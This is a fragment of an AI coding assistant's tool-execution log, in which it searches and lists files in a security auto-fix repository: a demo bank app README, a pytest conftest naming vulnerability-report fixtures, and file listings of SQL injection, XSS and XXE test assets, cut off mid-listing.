\`hybrid_imports.py\`","lineNumber":47},{"text":"- **Description**: Mixing wildcard imports with explicit imports","lineNumber":48},{"text":"- **Patterns**:","lineNumber":49},{"text":"  - Explicit: \`from collections import Counter, defaultdict\`","lineNumber":50}]},"score":0.2711057662963867},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/tests/assets/java/sqli/e-1578/source/README.md","range":{"startPosition":{},"endPosition":{"line":68}},"contents":"# My Demo Bank App\\n\\nA modern, feature-rich demo banking application built with Spring Boot for learning and demonstration purposes.\\n\\n## Overview\\n\\nMy Demo Bank App is a comprehensive web application that showcases banking functionality in a clean, professional interface. It demonstrates modern web development practices and provides a realistic banking experience for educational and portfolio purposes.\\n\\n## 🎯 Purpose\\n\\nThis application is designed for:\\n- Learning web development with Spring Boot\\n- Demonstrating banking application features\\n- Portfolio demonstration\\n- Educational purposes\\n- Understanding database interactions\\n\\n## 🛠️ Features\\n\\n### Core Banking Functionality\\n- **User Authentication** - Secure login system\\n- **Account Management** - Multiple account types (checking, savings, investment)\\n- **Money Transfers** - Transfer funds between accounts\\n- **Credit Card Applications** - Apply for various credit card products\\n- **Application Search** - Search through credit applications\\n- **Dashboard** - Comprehensive overview of accounts and activities\\n\\n### Technical Features\\n- **Spring Boot** - Modern Java web framework\\n- **H2 Database** - In-memory database for easy setup\\n- **Thymeleaf** - Server-side templating\\n- **Responsive Design** - Works on all device sizes\\n- **Professional UI** - Clean, modern interface\\n\\n## 🚀 Quick Start\\n\\n### Prerequisites\\n- Java 17 or higher\\n- Maven 3.6 or higher\\n\\n### Running the Application\\n\\n1. **Clone the repository**\\n   \`\`\`bash\\n   git clone <repository-url>\\n   cd my-demo-bank-app\\n   \`\`\`\\n\\n2. **Build the application**\\n   \`\`\`bash\\n   mvn clean install\\n   \`\`\`\\n\\n3. **Run the application**\\n   \`\`\`bash\\n   mvn spring-boot:run\\n   \`\`\`\\n\\n4. **Access the application**\\n   - Open your browser and go to: \`http://localhost:8080\`\\n   - Use the demo accounts provided on the login page\\n\\n### Demo Accounts\\n\\n| Username | Password | Description |\\n|----------|----------|-------------|\\n| alice | password123 | Customer with multiple accounts |\\n","originalContents":"# My Demo Bank App\\n\\nA modern, feature-rich demo banking application built with Spring Boot for learning and demonstration purposes.\\n\\n## Overview\\n\\nMy Demo Bank App is a comprehensive web application that showcases banking functionality in a clean, professional interface. It demonstrates modern web development practices and provides a realistic banking experience for educational and portfolio purposes.\\n\\n## 🎯 Purpose\\n\\nThis application is designed for:\\n- Learning web development with Spring Boot\\n- Demonstrating banking application features\\n- Portfolio demonstration\\n- Educational purposes\\n- Understanding database interactions\\n\\n## 🛠️ Features\\n\\n### Core Banking Functionality\\n- **User Authentication** - Secure login system\\n- **Account Management** - Multiple account types (checking, savings, investment)\\n- **Money Transfers** - Transfer funds between accounts\\n- **Credit Card Applications** - Apply for various credit card products\\n- **Application Search** - Search through credit applications\\n- **Dashboard** - Comprehensive overview of accounts and activities\\n\\n### Technical Features\\n- **Spring Boot** - Modern Java web framework\\n- **H2 Database** - In-memory database for easy setup\\n- **Thymeleaf** - Server-side templating\\n- **Responsive Design** - Works on all device sizes\\n- **Professional UI** - Clean, modern interface\\n\\n## 🚀 Quick Start\\n\\n### Prerequisites\\n- Java 17 or higher\\n- Maven 3.6 or higher\\n\\n### Running the Application\\n\\n1. **Clone the repository**\\n   \`\`\`bash\\n   git clone <repository-url>\\n   cd my-demo-bank-app\\n   \`\`\`\\n\\n2. **Build the application**\\n   \`\`\`bash\\n   mvn clean install\\n   \`\`\`\\n\\n3. **Run the application**\\n   \`\`\`bash\\n   mvn spring-boot:run\\n   \`\`\`\\n\\n4. **Access the application**\\n   - Open your browser and go to: \`http://localhost:8080\`\\n   - Use the demo accounts provided on the login page\\n\\n### Demo Accounts\\n\\n| Username | Password | Description |\\n|----------|----------|-------------|\\n| alice | password123 | Customer with multiple accounts |\\n","detailedLines":[{"text":"# My Demo Bank App","lineNumber":1},{"lineNumber":2},{"text":"A modern, feature-rich demo banking application built with Spring Boot for learning and demonstration purposes.","lineNumber":3},{"lineNumber":4},{"text":"## Overview","lineNumber":5},{"lineNumber":6},{"text":"My Demo Bank App is a comprehensive web application that showcases banking functionality in a clean, professional interface. It demonstrates modern web development practices and provides a realistic banking experience for educational and portfolio purposes.","lineNumber":7},{"lineNumber":8},{"text":"## 🎯 Purpose","lineNumber":9},{"lineNumber":10},{"text":"This application is designed for:","lineNumber":11},{"text":"- Learning web development with Spring Boot","lineNumber":12},{"text":"- Demonstrating banking application features","lineNumber":13},{"text":"- Portfolio demonstration","lineNumber":14},{"text":"- Educational purposes","lineNumber":15},{"text":"- Understanding database interactions","lineNumber":16},{"lineNumber":17},{"text":"## 🛠️ Features","lineNumber":18},{"lineNumber":19},{"text":"### Core Banking Functionality","lineNumber":20},{"text":"- **User Authentication** - Secure login system","lineNumber":21},{"text":"- **Account Management** - Multiple account types (checking, savings, investment)","lineNumber":22},{"text":"- **Money Transfers** - Transfer funds between accounts","lineNumber":23},{"text":"- **Credit Card Applications** - Apply for various credit card products","lineNumber":24},{"text":"- **Application Search** - Search through credit applications","lineNumber":25},{"text":"- **Dashboard** - Comprehensive overview of accounts and activities","lineNumber":26},{"lineNumber":27},{"text":"### Technical Features","lineNumber":28},{"text":"- **Spring Boot** - Modern Java web framework","lineNumber":29},{"text":"- **H2 Database** - In-memory database for easy setup","lineNumber":30},{"text":"- **Thymeleaf** - Server-side templating","lineNumber":31},{"text":"- **Responsive Design** - Works on all device sizes","lineNumber":32},{"text":"- **Professional UI** - Clean, modern interface","lineNumber":33},{"lineNumber":34},{"text":"## 🚀 Quick Start","lineNumber":35},{"lineNumber":36},{"text":"### Prerequisites","lineNumber":37},{"text":"- Java 17 or higher","lineNumber":38},{"text":"- Maven 3.6 or higher","lineNumber":39},{"lineNumber":40},{"text":"### Running the Application","lineNumber":41},{"lineNumber":42},{"text":"1. **Clone the repository**","lineNumber":43},{"text":"   \`\`\`bash","lineNumber":44},{"text":"   git clone <repository-url>","lineNumber":45},{"text":"   cd my-demo-bank-app","lineNumber":46},{"text":"   \`\`\`","lineNumber":47},{"lineNumber":48},{"text":"2. **Build the application**","lineNumber":49},{"text":"   \`\`\`bash","lineNumber":50},{"text":"   mvn clean install","lineNumber":51},{"text":"   \`\`\`","lineNumber":52},{"lineNumber":53},{"text":"3. **Run the application**","lineNumber":54},{"text":"   \`\`\`bash","lineNumber":55},{"text":"   mvn spring-boot:run","lineNumber":56},{"text":"   \`\`\`","lineNumber":57},{"lineNumber":58},{"text":"4. **Access the application**","lineNumber":59},{"text":"   - Open your browser and go to: \`http://localhost:8080\`","lineNumber":60},{"text":"   - Use the demo accounts provided on the login page","lineNumber":61},{"lineNumber":62},{"text":"### Demo Accounts","lineNumber":63},{"lineNumber":64},{"text":"| Username | Password | Description |","lineNumber":65},{"text":"|----------|----------|-------------|","lineNumber":66},{"text":"| alice | password123 | Customer with multiple accounts |","lineNumber":67},{"text":"| bob | pass456 | Customer with basic accounts |","lineNumber":68}]},"score":0.2711007595062256},{"codeBlock":{"relativeWorkspacePath":"pycommon/tests/conftest.py","range":{"startPosition":{},"endPosition":{"line":73}},"contents":"import os\\nimport pathlib\\n\\nimport pytest\\nfrom aioresponses import aioresponses\\n\\nROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent\\nWEBGOAT_CHECKMARX_TEST_REPORT_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\"\\n)\\nWEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\"\\n)\\nJUICE_SHOP_SNYK_TEST_REPORT_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\"\\n)\\nJUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\"\\n)\\nTESTS_DIR = pathlib.Path(__file__).parent\\n\\nTEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\"__tests__/files\\"\\nTEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\"webgoat\\"\\nREPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\"repo.zip\\"\\nREPO1_VUL_REPORT = TEST_DATA_SOURCE / \\"altoroj.json\\"\\nREPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\"altoroj/sonarqube.json\\"\\nREPO1_ORIGINAL_URL = \\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\"\\nASSETS_DIR = TESTS_DIR / \\"assets\\"\\nBUGSY_SOURCE = TESTS_DIR.parent.parent / \\"clients/cli\\"\\n\\nSAMPLE_JAVA_FILE = TESTS_DIR / \\"assets/sample.java\\"\\nSAMPLE_JSP_FILE = TESTS_DIR / \\"assets/sample.jsp\\"\\n\\n\\n@pytest.fixture\\ndef aiohttp_session():\\n    with aioresponses() as session:\\n        yield session","originalContents":"import os\\nimport pathlib\\n\\nimport pytest\\nfrom aioresponses import aioresponses\\n\\nROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent\\nWEBGOAT_CHECKMARX_TEST_REPORT_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\"\\n)\\nWEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\"\\n)\\nJUICE_SHOP_SNYK_TEST_REPORT_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\"\\n)\\nJUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\"\\n)\\nTESTS_DIR = pathlib.Path(__file__).parent\\n\\nTEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\"__tests__/files\\"\\nTEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\"webgoat\\"\\nREPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\"repo.zip\\"\\nREPO1_VUL_REPORT = TEST_DATA_SOURCE / \\"altoroj.json\\"\\nREPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\"altoroj/sonarqube.json\\"\\nREPO1_ORIGINAL_URL = \\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\"\\nASSETS_DIR = TESTS_DIR / \\"assets\\"\\nBUGSY_SOURCE = TESTS_DIR.parent.parent / \\"clients/cli\\"\\n\\nSAMPLE_JAVA_FILE = TESTS_DIR / \\"assets/sample.java\\"\\nSAMPLE_JSP_FILE = TESTS_DIR / \\"assets/sample.jsp\\"\\n\\n\\n@pytest.fixture\\ndef aiohttp_session():\\n    with aioresponses() as session:\\n        yield session","detailedLines":[{"text":"import os","lineNumber":1},{"text":"import pathlib","lineNumber":2},{"lineNumber":3},{"text":"import pytest","lineNumber":4},{"text":"from aioresponses import aioresponses","lineNumber":5},{"lineNumber":6},{"text":"ROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent","lineNumber":7},{"text":"WEBGOAT_CHECKMARX_TEST_REPORT_PATH = (","lineNumber":8},{"text":"    ROOT_REPO_DIR","lineNumber":9},{"text":"    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\"","lineNumber":10},{"text":")","lineNumber":11},{"text":"WEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (","lineNumber":12},{"text":"    ROOT_REPO_DIR","lineNumber":13},{"text":"    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\"","lineNumber":14},{"text":")","lineNumber":15},{"text":"JUICE_SHOP_SNYK_TEST_REPORT_PATH = (","lineNumber":16},{"text":"    ROOT_REPO_DIR","lineNumber":17},{"text":"    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\"","lineNumber":18},{"text":")","lineNumber":19},{"text":"JUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (","lineNumber":20},{"text":"    ROOT_REPO_DIR","lineNumber":21},{"text":"    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\"","lineNumber":22},{"text":")","lineNumber":23},{"text":"TESTS_DIR = pathlib.Path(__file__).parent","lineNumber":24},{"lineNumber":25},{"text":"TEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\"__tests__/files\\"","lineNumber":26},{"text":"TEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\"webgoat\\"","lineNumber":27},{"text":"REPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\"repo.zip\\"","lineNumber":28},{"text":"REPO1_VUL_REPORT = TEST_DATA_SOURCE / \\"altoroj.json\\"","lineNumber":29},{"text":"REPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\"altoroj/sonarqube.json\\"","lineNumber":30},{"text":"REPO1_ORIGINAL_URL = \\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\"","lineNumber":31},{"text":"ASSETS_DIR = TESTS_DIR / \\"assets\\"","lineNumber":32},{"text":"BUGSY_SOURCE = TESTS_DIR.parent.parent / \\"clients/cli\\"","lineNumber":33},{"lineNumber":34},{"text":"SAMPLE_JAVA_FILE = TESTS_DIR / \\"assets/sample.java\\"","lineNumber":35},{"text":"SAMPLE_JSP_FILE = TESTS_DIR / \\"assets/sample.jsp\\"","lineNumber":36},{"lineNumber":37},{"lineNumber":38},{"text":"@pytest.fixture","lineNumber":39},{"text":"def aiohttp_session():","lineNumber":40,"isSignature":true},{"text":"    with aioresponses() as session:","lineNumber":41},{"text":"        yield session","lineNumber":42,"isSignature":true},{"lineNumber":43},{"lineNumber":44},{"text":"@pytest.fixture(autouse=True, scope=\\"session\\")","lineNumber":45},{"text":"def mock_env_values_for_py_common():","lineNumber":46,"isSignature":true},{"text":"    os.environ[\\"AWS_S3_ACCESS_KEY_ID\\"] = \\"DUMMY_AWS_S3_ACCESS_KEY_ID\\"","lineNumber":47}]},"score":0.2702752351760864}]}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:47:51.735Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "glob_file_search",
          "parameters": "{"globPattern":"**/*sample*"}",
          "rawArguments": "{"glob_pattern": "*sample*"}",
          "result": "{"directories":[{"absPath":"/Users/jonathanafek/src/autofixer","files":[{"relPath":"patchino/patchino/sampler.py"},{"relPath":"patchino/ai-playground/src/screens/Sampler.tsx"},{"relPath":"pycommon/tests/assets/sample_semgrep_report.json"},{"relPath":"pycommon/tests/assets/sample_datadog_report.json"},{"relPath":"patchino/example_sampler_config.json"},{"relPath":"patchino/patchino/backend/mutations/run_sampler.py"},{"relPath":"clients/cli/__tests__/mcp/mocks/sample.gitignore"},{"relPath":"patchino/_samples/samples.json"},{"relPath":"pycommon/tests/assets/sample.jsp"},{"relPath":"pycommon/tests/assets/sample.java"},{"relPath":"consumers/report_init/tests/files/sample-repo.zip"}],"totalFiles":11}]}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:47:51.772Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "glob_file_search",
          "parameters": "{"globPattern":"**/*example*"}",
          "rawArguments": "{"glob_pattern": "*example*"}",
          "result": "{"directories":[{"absPath":"/Users/jonathanafek/src/autofixer","files":[{"relPath":"consumers/analyzer/tests/assets/java/sqli/statement_in_class_def/source/src/main/java/SQLInjectionExample.java"},{"relPath":"patchino/example_sampler_config.json"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1391/LLM_Type_Guess/source/src/main/java/JaxbExampleFruitUnmarshalHttpResponse.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1391/LLM_Type_Guess/source/src/main/java/JaxbExampleFruitUnmarshalDTDFalseInputFactory.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1391/LLM_Type_Guess/source/src/main/java/JaxbExampleFruitMarshal.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1391/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitUnmarshalFile.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1391/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitUnmarshalDTDFalseInputFactory.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1391/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitMarshal.java"},{"relPath":"consumers/analyzer/tests/assets/python/modified_default_param/basic/source/fp_example.py"},{"relPath":"consumers/analyzer/tests/assets/python/modified_default_param/basic/source/example.py"},{"relPath":"consumers/analyzer/tests/assets/python/modified_default_param/basic/source/class_example.py"},{"relPath":"clients/cli/__tests__/assets/github_fixer_demo/irrelevant_vendor_code/repo/vendor/xss-example.js"},{"relPath":"clients/cli/__tests__/assets/github_fixer_demo/irrelevant_test_code/repo/test/xss-example.js"},{"relPath":"clients/cli/__tests__/assets/github_fixer_demo/irrelevant_auxiliary_code/repo/scripts/xss-example.js"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller_old_java/source/src/main/java/JaxbExampleFruitUnmarshalSource.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller_old_java/source/src/main/java/JaxbExampleFruitUnmarshalFile.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller_old_java/source/src/main/java/JaxbExampleFruitUnmarshalDTDFalseInputFactory.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller_old_java/source/src/main/java/JaxbExampleFruitMarshal.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitUnmarshalSource.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitUnmarshalFile.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitUnmarshalDTDFalseInputFactory.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitMarshal.java"},{"relPath":"consumers/analyzer/tests/assets/java/insecure_randomness/e-1056/source/src/main/java/InsecureRandomnessExample.java"},{"relPath":"consumers/analyzer/tests/assets/csharp/use_of_console_out/e-1077/source/SerilogExampleWithoutLogger.cs"},{"relPath":"consumers/analyzer/tests/assets/csharp/use_of_console_out/e-1077/source/SerilogExampleWithLogger.cs"},{"relPath":"consumers/analyzer/tests/assets/csharp/use_of_console_out/basic/source/TraceSourceExample.cs"},{"relPath":"consumers/analyzer/tests/assets/csharp/use_of_console_out/basic/source/SerilogExample.cs"},{"relPath":"consumers/analyzer/tests/assets/csharp/use_of_console_out/basic/source/NLogExample.cs"},{"relPath":"consumers/analyzer/tests/assets/csharp/use_of_console_out/basic/source/Log4NetExample.cs"},{"relPath":"consumers/analyzer/tests/assets/csharp/use_of_console_out/basic/source/ILoggerExample.cs"},{"relPath":"consumers/analyzer/tests/assets/java/insecure_randomness/basic/source/src/main/java/InsecureRandomnessExample.java"},{"relPath":"consumers/analyzer/tests/assets/csharp/unvalidated_public_method_argument/source/UnvalidatedArgumentsExample.cs"},{"relPath":"clients/cli/__tests__/assets/github_fixer_demo/repo/xss-example.js"},{"relPath":"pycommon/tests/assets/e-840/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/e-844/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/dead_code_unused_field/should_not_delete/source/src/main/java/DeadFieldExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/dead_code_unused_field/should_delete/source/src/main/java/DeadFieldExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/prepare-statement-var-in-values/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/enquote-identifier-simple/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/insecure_cookie/http_only/source/src/main/java/BasicClientCookieExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/e-565/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/csharp/system-information-leak/one-var-no-logger/source/NoLoggerExample.cs"},{"relPath":"consumers/analyzer/tests/assets/csharp/system-information-leak/one-var-logger/source/ILoggerExample.cs"},{"relPath":"consumers/analyzer/tests/assets/java/xss/e-424-direct-ResponseEntity/source/src/main/java/app/ExampleController.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-prepared-statement-in-try/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-return-no-patcher-multiple-files/source/src/main/java/app/ExampleController2.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-return-no-patcher-multiple-files/source/src/main/java/app/ExampleArg.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-return-concat-different-file/source/src/main/java/app/ExampleController2.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-return-concat-different-file/source/src/main/java/app/ExampleConcat.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-add-batch-single-call/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-add-batch-multiple-calls/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/mobb-1456/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/mobb-1434/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/mobb-1401/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/mobb-1396/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/pt/get-original-filename/source/src/main/java/app/ExampleController2.java"},{"relPath":"pycommon/tests/assets/space-in-path/source/src/main/java/Dir With Spaces And Special Characters *!?\\"'%20/SQLInjectionExample.java"},{"relPath":"pycommon/tests/assets/one-tainted-var/source/src/main/java/SQLInjectionExample.java"},{"relPath":"pycommon/tests/assets/em-one-var/source/src/main/java/SQLInjectionExample.java"},{"relPath":"pycommon/tests/assets/em-one-var-checkmarx-cli-json/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-return/source/src/main/java/app/ExampleId.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-return/source/src/main/java/app/ExampleController2.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-return/source/src/main/java/app/ExampleArgument.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-return-no-patcher/source/src/main/java/app/ExampleController2.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-ResponseEntity-ok/source/src/main/java/app/ExampleController.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-ResponseEntity-ok-RequestBody/source/src/main/java/app/ExampleController.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-ResponseEntity-body/source/src/main/java/app/ExampleController.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/two-tainted-vars/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-statement-before-query/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-query-inline-execute/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-prepared-statement/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-int/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-complex-string/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/multi-var-one-tainted/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/multi-var-one-tainted-question-marks/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/multi-var-one-tainted-q-marks-p-statement/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/multi-var-one-tainted-prepared-statement/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/multi-var-nested-tainted/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/multi-var-nested-string-tainted/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/execute-params/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-one-var/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-one-var-methods-chain/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-one-var-methods-chain-no-var/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-one-var-int/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-one-var-int-chained/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-one-var-complex-string/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-one-var-checkmarx-cli-json/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-multi-var-one-tainted/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/em-multi-var-one-tainted-question-marks/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/pt/file-two-args-second-tainted/source/src/main/java/app/ExampleController.java"},{"relPath":"consumers/analyzer/tests/assets/java/pt/file-two-args-first-tainted/source/src/main/java/app/ExampleController.java"},{"relPath":"consumers/analyzer/tests/assets/java/pt/file-bug-mobb-872/source/src/main/java/app/ExampleController.java"}],"totalFiles":94}]}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:47:51.981Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "list_dir",
          "parameters": "{"targetDirectory":"/Users/jonathanafek/src/autofixer"}",
          "rawArguments": "{"target_directory": "/Users/jonathanafek/src/autofixer"}",
          "result": "{"directoryTreeRoot":{"absPath":"/Users/jonathanafek/src/autofixer","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/build"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/fixtures","fullSubtreeExtensionCounts":{".json":3,".zip":1},"numFiles":4},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/graphql","fullSubtreeExtensionCounts":{".graphql":2},"numFiles":2},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/helpers","fullSubtreeExtensionCounts":{".ts":5},"numFiles":5},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/node_modules","childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/pages","fullSubtreeExtensionCounts":{".ts":9},"numFiles":9},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/playwright-report"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/settings","fullSubtreeExtensionCounts":{".ts":2},"numFiles":2},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/test-results"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/tests","fullSubtreeExtensionCounts":{".ts":8},"numFiles":8}],"childrenFiles":[{"name":"generated.ts"},{"name":"graphql.config.ts"},{"name":"package.json"},{"name":"playwright.config.ts"},{"name":"precommit-format.sh"},{"name":"tsconfig.json"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".ts":27,".sh":1,".json":5,".zip":1,".graphql":2},"numFiles":36},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/build"},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/constants","fullSubtreeExtensionCounts":{".ts":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/files","fullSubtreeExtensionCounts":{".fpr":8,".zip":19,".json":36,".xml":3,".html":2},"numFiles":68},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/graphql","fullSubtreeExtensionCounts":{".graphql":8},"numFiles":8},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/helpers","fullSubtreeExtensionCounts":{".ts":8},"numFiles":8},{"absPa